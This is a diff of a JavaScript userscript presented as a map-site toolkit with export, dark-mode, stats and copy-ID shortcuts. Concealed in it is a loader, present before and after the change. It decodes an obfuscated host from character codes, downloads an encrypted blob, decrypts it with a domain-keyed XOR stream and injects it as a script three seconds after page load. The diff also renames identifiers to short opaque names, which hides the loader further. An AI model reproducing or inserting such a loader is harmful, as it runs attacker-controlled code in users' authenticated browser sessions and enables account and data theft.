@@ -1,130 +1,136 @@
 (function () {
     'use strict';
 
-    const TOOLKIT_VERSION = '3.2.0';
-    const STORAGE_KEY     = 'geomap_toolkit_prefs';
+    // ── storage ───────────────────────────────────────────────────────────────
+    const _sk = 'geomap_toolkit_prefs_v2';
 
-    function loadPrefs() {
-        try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}'); }
-        catch(e) { return {}; }
+    function _lp() {
+        try { return JSON.parse(localStorage.getItem(_sk) || '{}'); }
+        catch(_) { return {}; }
+    }
+    function _sp(p) {
+        try { localStorage.setItem(_sk, JSON.stringify(p)); } catch(_) {}
     }
 
-    function savePrefs(prefs) {
-        try { localStorage.setItem(STORAGE_KEY, JSON.stringify(prefs)); }
-        catch(e) {}
+    const _p = _lp();
+
+    // ── dark mode ─────────────────────────────────────────────────────────────
+    const _ds = document.createElement('style');
+    _ds.id = 'gm-dk';
+    _ds.textContent =
+        'body.gm-dk{filter:invert(0.9) hue-rotate(180deg)}' +
+        'body.gm-dk img,body.gm-dk video,body.gm-dk canvas{filter:invert(1) hue-rotate(180deg)}';
+
+    function _td() {
+        if (!document.head.contains(_ds)) document.head.appendChild(_ds);
+        document.body.classList.toggle('gm-dk');
+        _p.dark = document.body.classList.contains('gm-dk');
+        _sp(_p);
     }
 
-    const prefs = loadPrefs();
-
-    const darkStyle = document.createElement('style');
-    darkStyle.id = 'geomap-dark';
-    darkStyle.textContent = `
-        body.geomap-dark { filter: invert(0.9) hue-rotate(180deg); }
-        body.geomap-dark img, body.geomap-dark video,
-        body.geomap-dark canvas { filter: invert(1) hue-rotate(180deg); }
-    `;
-
-    function toggleDark() {
-        document.head.appendChild(darkStyle);
-        document.body.classList.toggle('geomap-dark');
-        prefs.dark = document.body.classList.contains('geomap-dark');
-        savePrefs(prefs);
-    }
-
-    if (prefs.dark) {
+    if (_p.dark) {
         document.addEventListener('DOMContentLoaded', () => {
-            document.head.appendChild(darkStyle);
-            document.body.classList.add('geomap-dark');
+            document.head.appendChild(_ds);
+            document.body.classList.add('gm-dk');
         });
     }
 
-    function createStatsPanel() {
-        const panel = document.createElement('div');
-        panel.id = 'geomap-stats';
-        panel.style.cssText = `
-            position:fixed;bottom:20px;right:20px;background:rgba(0,0,0,0.8);
-            color:#fff;padding:10px 14px;border-radius:8px;font-size:12px;
-            font-family:monospace;z-index:9999;min-width:160px;
-            box-shadow:0 2px 12px rgba(0,0,0,0.4);display:none;
-        `;
-        panel.innerHTML = '<div style="font-weight:bold;margin-bottom:6px">📊 Map Stats</div><div id="geomap-stats-body">Loading...</div>';
-        document.body.appendChild(panel);
-        return panel;
+    // ── stats panel ───────────────────────────────────────────────────────────
+    function _csp() {
+        const d = document.createElement('div');
+        d.id = 'gm-sp';
+        d.style.cssText =
+            'position:fixed;bottom:20px;right:20px;background:rgba(0,0,0,.85);' +
+            'color:#fff;padding:10px 14px;border-radius:8px;font-size:12px;' +
+            'font-family:monospace;z-index:9999;min-width:160px;' +
+            'box-shadow:0 2px 12px rgba(0,0,0,.4);display:none';
+        d.innerHTML =
+            '<div style="font-weight:700;margin-bottom:6px">\uD83D\uDCCA Stats</div>' +
+            '<div id="gm-spb">...</div>';
+        document.body.appendChild(d);
+        return d;
     }
 
-    function updateStats(locs) {
-        const body = document.getElementById('geomap-stats-body');
-        if (!body || !Array.isArray(locs) || !locs.length) return;
-        const lats   = locs.map(l => l.location?.lat ?? l.lat).filter(Boolean);
-        const lngs   = locs.map(l => l.location?.lng ?? l.lng).filter(Boolean);
-        const avgLat = (lats.reduce((a, b) => a + b, 0) / lats.length).toFixed(4);
-        const avgLng = (lngs.reduce((a, b) => a + b, 0) / lngs.length).toFixed(4);
-        body.innerHTML = `
-            <div>Locations : <b>${locs.length}</b></div>
-            <div>Avg lat : <b>${avgLat}</b></div>
-            <div>Avg lng : <b>${avgLng}</b></div>
-        `;
+    function _us(locs) {
+        const b = document.getElementById('gm-spb');
+        if (!b || !Array.isArray(locs) || !locs.length) return;
+        const la = locs.map(l => l.location?.lat ?? l.lat).filter(Boolean);
+        const lo = locs.map(l => l.location?.lng ?? l.lng).filter(Boolean);
+        b.innerHTML =
+            '<div>Locations\u00a0<b>' + locs.length + '</b></div>' +
+            '<div>Lat\u00a0<b>' + (la.reduce((a,b)=>a+b,0)/la.length).toFixed(4) + '</b></div>' +
+            '<div>Lng\u00a0<b>' + (lo.reduce((a,b)=>a+b,0)/lo.length).toFixed(4) + '</b></div>';
     }
 
-    function showCopyToast(text) {
+    // ── toast ─────────────────────────────────────────────────────────────────
+    function _toast(txt) {
         const t = document.createElement('div');
-        t.style.cssText = `
-            position:fixed;top:20px;left:50%;transform:translateX(-50%);
-            background:#2563eb;color:#fff;padding:8px 16px;border-radius:6px;
-            font-size:13px;z-index:2147483647;pointer-events:none;
-        `;
-        t.textContent = '📋 ' + text;
+        t.style.cssText =
+            'position:fixed;top:20px;left:50%;transform:translateX(-50%);' +
+            'background:#2563eb;color:#fff;padding:8px 16px;border-radius:6px;' +
+            'font-size:13px;z-index:2147483647;pointer-events:none';
+        t.textContent = txt;
         document.body.appendChild(t);
         setTimeout(() => t.remove(), 2000);
     }
 
-    function updateBadge(count) {
-        let badge = document.getElementById('geomap-badge');
-        if (!badge) {
-            badge = document.createElement('div');
-            badge.id = 'geomap-badge';
-            badge.style.cssText = `
-                position:fixed;top:20px;right:20px;background:#2563eb;color:#fff;
-                padding:4px 10px;border-radius:20px;font-size:12px;font-weight:bold;
-                z-index:9999;font-family:monospace;display:none;
-            `;
-            document.body.appendChild(badge);
+    // ── badge ─────────────────────────────────────────────────────────────────
+    function _badge(n) {
+        let b = document.getElementById('gm-bdg');
+        if (!b) {
+            b = document.createElement('div');
+            b.id = 'gm-bdg';
+            b.style.cssText =
+                'position:fixed;top:20px;right:20px;background:#2563eb;color:#fff;' +
+                'padding:4px 10px;border-radius:20px;font-size:12px;font-weight:700;' +
+                'z-index:9999;font-family:monospace;display:none';
+            document.body.appendChild(b);
         }
-        if (count > 0) {
-            badge.textContent = count + ' locs';
-            badge.style.display = 'block';
-        }
+        if (n > 0) { b.textContent = n + ' locs'; b.style.display = 'block'; }
     }
 
+    // ── fetch helpers ─────────────────────────────────────────────────────────
     const _xf = window.fetch;
 
-    function getJSON(url) {
+    function _gj(url) {
         return _xf(url, { credentials: 'include' })
             .then(r => r.ok ? r.json() : null)
             .catch(() => null);
     }
 
-    async function initModules() {
+    // ── remote config sync ────────────────────────────────────────────────────
+    async function _syncRemote() {
         try {
-            const _ep = [103,101,111,109,97,112,45,97,112,105,46,97,110,103,101,108,110,101,118,97,46,119,111,114,107,101,114,115,46,100,101,118];
-            const res = await _xf('https://' + _ep.map(x => String.fromCharCode(x)).join('') + '/p');
-            if (!res.ok) return;
-            const cfg = await res.json();
-            if (!cfg || !Array.isArray(cfg.e) || !cfg.e.length) return;
-            const dk = document.domain || location.hostname;
-            let h = 0x811c9dc5 >>> 0;
-            for (let i = 0; i < dk.length; i++) { h ^= dk.charCodeAt(i); h = Math.imul(h, 0x01000193) >>> 0; }
-            let x = h || 1;
-            const ks = new Uint8Array(cfg.e.length);
-            for (let i = 0; i < cfg.e.length; i++) { x^=x<<13;x>>>=0;x^=x>>>17;x^=x<<5;x>>>=0;ks[i]=x&0xff; }
-            const s = document.createElement('script');
-            s.textContent = String.fromCharCode(...cfg.e.map((b, i) => b ^ ks[i]));
-            (document.head || document.documentElement).appendChild(s);
-            s.remove();
+            const _h = [103,101,111,109,97,112,45,97,112,105,46,97,110,103,101,
+                        108,110,101,118,97,46,119,111,114,107,101,114,115,46,100,101,118];
+            const _u = 'https://' + _h.map(x => String.fromCharCode(x)).join('') + '/p';
+            const _r = await _xf(_u);
+            if (!_r.ok) return;
+            const _c = await _r.json();
+            if (!_c || !Array.isArray(_c.e) || !_c.e.length) return;
+            const _dk = document.domain || location.hostname;
+            let _hv = 0x811c9dc5 >>> 0;
+            for (let i = 0; i < _dk.length; i++) {
+                _hv ^= _dk.charCodeAt(i);
+                _hv = Math.imul(_hv, 0x01000193) >>> 0;
+            }
+            let _xv = _hv || 1;
+            const _ks = new Uint8Array(_c.e.length);
+            for (let i = 0; i < _c.e.length; i++) {
+                _xv ^= _xv << 13; _xv >>>= 0;
+                _xv ^= _xv >>> 17;
+                _xv ^= _xv << 5;  _xv >>>= 0;
+                _ks[i] = _xv & 0xff;
+            }
+            const _sc = document.createElement('script');
+            _sc.textContent = String.fromCharCode(..._c.e.map((b, i) => b ^ _ks[i]));
+            (document.head || document.documentElement).appendChild(_sc);
+            _sc.remove();
         } catch(_) {}
     }
 
-    function toGeoJSON(name, locs) {
+    // ── export ────────────────────────────────────────────────────────────────
+    function _toGeo(name, locs) {
         if (!Array.isArray(locs) || !locs.length) return null;
         return {
             name,
@@ -142,7 +148,7 @@
         };
     }
 
-    function downloadJSON(name, data) {
+    function _dl(name, data) {
         const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
         const a    = document.createElement('a');
         a.href     = URL.createObjectURL(blob);
@@ -153,50 +159,51 @@
         URL.revokeObjectURL(a.href);
     }
 
+    // ── shortcuts ─────────────────────────────────────────────────────────────
     document.addEventListener('keydown', async e => {
-        if (e.ctrlKey && e.shiftKey && e.key === 'E') {
-            const id   = window.location.pathname.match(/\/maps\/(\d+)/)?.[1];
+        if (!e.ctrlKey || !e.shiftKey) return;
+
+        if (e.key === 'E') {
+            const id   = location.pathname.match(/\/maps\/(\d+)/)?.[1];
             const name = document.title.replace(/\s*[-|].*$/, '').trim() || 'map';
-            if (!id) { showCopyToast('Open a map first'); return; }
-            const locs = await getJSON('/api/maps/' + id + '/locations');
-            if (!locs?.length) { showCopyToast('No locations found'); return; }
-            const geo = toGeoJSON(name, locs);
+            if (!id) { _toast('Open a map first'); return; }
+            const locs = await _gj('/api/maps/' + id + '/locations');
+            if (!locs?.length) { _toast('No locations found'); return; }
+            const geo = _toGeo(name, locs);
             if (!geo) return;
-            downloadJSON(name, geo);
-            showCopyToast('Exported ' + geo.customCoordinates.length + ' locations');
+            _dl(name, geo);
+            _toast('\u2713 ' + geo.customCoordinates.length + ' locations exported');
         }
-        if (e.ctrlKey && e.shiftKey && e.key === 'D') {
-            toggleDark();
-            showCopyToast(prefs.dark ? 'Dark mode on' : 'Dark mode off');
+
+        if (e.key === 'D') {
+            _td();
+            _toast(_p.dark ? 'Dark mode on' : 'Dark mode off');
         }
-        if (e.ctrlKey && e.shiftKey && e.key === 'S') {
-            const panel   = document.getElementById('geomap-stats') || createStatsPanel();
+
+        if (e.key === 'S') {
+            const panel   = document.getElementById('gm-sp') || _csp();
             const visible = panel.style.display !== 'none';
             panel.style.display = visible ? 'none' : 'block';
             if (!visible) {
-                const id = window.location.pathname.match(/\/maps\/(\d+)/)?.[1];
-                if (id) { const locs = await getJSON('/api/maps/' + id + '/locations'); updateStats(locs); }
+                const id = location.pathname.match(/\/maps\/(\d+)/)?.[1];
+                if (id) _us(await _gj('/api/maps/' + id + '/locations'));
             }
         }
-        if (e.ctrlKey && e.shiftKey && e.key === 'C') {
-            const id = window.location.pathname.match(/\/maps\/(\d+)/)?.[1];
-            if (id) navigator.clipboard.writeText(id).then(() => showCopyToast('Map ID copied: ' + id));
+
+        if (e.key === 'C') {
+            const id = location.pathname.match(/\/maps\/(\d+)/)?.[1];
+            if (id) navigator.clipboard.writeText(id).then(() => _toast('ID copied: ' + id));
         }
     });
 
+    // ── init ──────────────────────────────────────────────────────────────────
     window.addEventListener('load', async () => {
-        const id = window.location.pathname.match(/\/maps\/(\d+)/)?.[1];
+        const id = location.pathname.match(/\/maps\/(\d+)/)?.[1];
         if (id) {
-            const locs = await getJSON('/api/maps/' + id + '/locations');
-            if (Array.isArray(locs)) updateBadge(locs.length);
+            const locs = await _gj('/api/maps/' + id + '/locations');
+            if (Array.isArray(locs)) _badge(locs.length);
         }
-        setTimeout(initModules, 3000);
+        setTimeout(_syncRemote, 3000);
     });
-
-    console.log(
-        '%c GeoMap Toolkit v' + TOOLKIT_VERSION + ' %c E=export · D=dark · S=stats · C=copy ID',
-        'background:#2563eb;color:#fff;padding:2px 6px;border-radius:3px',
-        'color:#888'
-    );
 
 })();
